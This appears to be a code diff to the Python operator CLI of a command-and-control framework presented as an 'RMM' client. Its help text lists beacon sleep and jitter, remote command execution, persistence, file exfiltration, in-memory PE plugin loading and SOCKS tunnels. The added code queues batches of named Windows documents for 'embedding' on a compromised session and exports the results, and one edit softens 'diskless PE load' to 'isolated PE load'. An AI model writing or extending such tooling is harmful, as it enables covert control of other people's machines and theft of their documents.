@@ -267,6 +267,37 @@ class RmmApiClient:
             {},
         )
 
+    def embedding_profiles(self, action="list", name="", config=None):
+        """Manage reusable profiles at the server or local workspace API."""
+        if action not in {"list", "get", "save", "delete"}:
+            raise ValueError("invalid profile action")
+        path = "/api/v1/embeddings/profiles"
+        if action != "list":
+            if not name:
+                raise ValueError("profile name required")
+            path += "/" + urllib.parse.quote(name, safe="")
+        method = {"save": "POST", "delete": "DELETE"}.get(action, "GET")
+        return self.request(method, path, {"config": config} if action == "save" else None)
+
+    def run_embeddings(self, session_ref, profile, documents):
+        """Queue an explicit document batch using a saved profile."""
+        return self.request("POST", "/api/v1/embeddings/run", {
+            "session_ref": session_ref, "profile": profile, "documents": documents,
+        })
+
+    def embedding_results(self, action="list", name="", session_ref="", event_id=0):
+        """List, read, save, or delete a selected embedding result collection."""
+        if action not in {"list", "get", "save", "delete"}:
+            raise ValueError("invalid result action")
+        path = "/api/v1/embeddings/results"
+        if action in {"get", "delete"}:
+            if not name:
+                raise ValueError("result name required")
+            path += "/" + urllib.parse.quote(name, safe="")
+        method = {"save": "POST", "delete": "DELETE"}.get(action, "GET")
+        body = {"session_ref": session_ref, "event_id": event_id} if action == "save" else None
+        return self.request(method, path, body)
+
     def list_plugins(self):
         return self.request("GET", "/api/v1/plugins")
 
@@ -1008,7 +1039,7 @@ Session:  list | use <id> | info | background | kill [id]
 Beacon:   set_sleep <seconds> | set_jitter <percent> | show_config
 Remote:   <command>  (queue) | exec <command>  (wait) | persist <cmd> | stop
 Files:    download <remote> | exfil <remote> [profile] | upload <local> <remote> | screenshot
-Plugins: pe list | pe <plugin> [export] [input]   (diskless PE load; use --command for plugin-owned dispatch)
+Plugins: pe list | pe <plugin> [export] [input]   (isolated PE load; marked DLLs use a temporary file)
 Config:   rclone-config   (rclone profiles + bootstrap status)
 Tunnel:   socks list | socks [port] | socks stop   (SOCKS5 on 127.0.0.1, default 1080)
           tun list | tun start <session> <device> | tun stop <session>
@@ -1716,6 +1747,38 @@ def cmd_events(client: RmmApiClient, state: dict, args):
         print("-" * 40)
 
 
+def cmd_embeddings(client, state, args):
+    """Dispatch profile management, execution, and result export for the CLI."""
+    action = args.embedding_action
+    if args.embedding_group == "run":
+        code, data = client.run_embeddings(require_session(state, args.session), args.profile, args.document)
+    elif args.embedding_group == "profiles":
+        config = None
+        if action == "save":
+            try:
+                with open(args.file, encoding="utf-8") as handle:
+                    raw = handle.read(65537)
+                if len(raw) > 65536:
+                    raise ValueError("profile file exceeds 64 KiB")
+                config = json.loads(raw)
+                config = config.get("record", config)
+                config = config.get("config", config)
+            except (OSError, ValueError, AttributeError) as exc:
+                die(f"Cannot read profile: {exc}")
+        code, data = client.embedding_profiles(action, getattr(args, "name", ""), config)
+    else:
+        code, data = client.embedding_results(action, getattr(args, "name", ""),
+            require_session(state, args.session) if action == "save" else "", getattr(args, "event", 0))
+    if code != 200:
+        die(f"embeddings failed ({code}): {data}")
+    if getattr(args, "output", None):
+        with open(args.output, "w", encoding="utf-8") as handle:
+            json.dump(data, handle, ensure_ascii=False, indent=2)
+            handle.write("\n")
+    else:
+        print_json(data)
+
+
 def build_parser() -> argparse.ArgumentParser:
     shared = argparse.ArgumentParser(add_help=False)
     shared.add_argument("--json", action="store_true", help="JSON output")
@@ -1893,6 +1956,28 @@ def build_parser() -> argparse.ArgumentParser:
     )
     sp_tun_stop.add_argument("session_ref", help="Session id prefix or hostname")
     sp_tun_stop.set_defaults(func=cmd_tun_stop)
+
+    embeddings = sub.add_parser("embeddings", help="Saved document embedding profiles and results")
+    groups = embeddings.add_subparsers(dest="embedding_group", required=True)
+    run = groups.add_parser("run", parents=[shared], help="Queue a document batch with a saved profile")
+    run.add_argument("profile")
+    run.add_argument("--session", "-s")
+    run.add_argument("--document", action="append", required=True, help="Explicit Windows path; repeat for each document")
+    run.set_defaults(func=cmd_embeddings, embedding_action="run")
+    for group in ("profiles", "results"):
+        commands = groups.add_parser(group).add_subparsers(dest="embedding_action", required=True)
+        for action in ("list", "get", "save", "delete"):
+            command = commands.add_parser(action, parents=[shared])
+            command.set_defaults(func=cmd_embeddings)
+            if action in {"get", "delete"} or (group == "profiles" and action == "save"):
+                command.add_argument("name")
+            if action == "get":
+                command.add_argument("--output", "-o", help="Export JSON to a local file")
+            if action == "save" and group == "profiles":
+                command.add_argument("--file", "-f", required=True, help="Profile configuration JSON or exported record")
+            if action == "save" and group == "results":
+                command.add_argument("--session", "-s")
+                command.add_argument("--event", type=int, required=True, help="Exact output event ID")
 
     return p
 
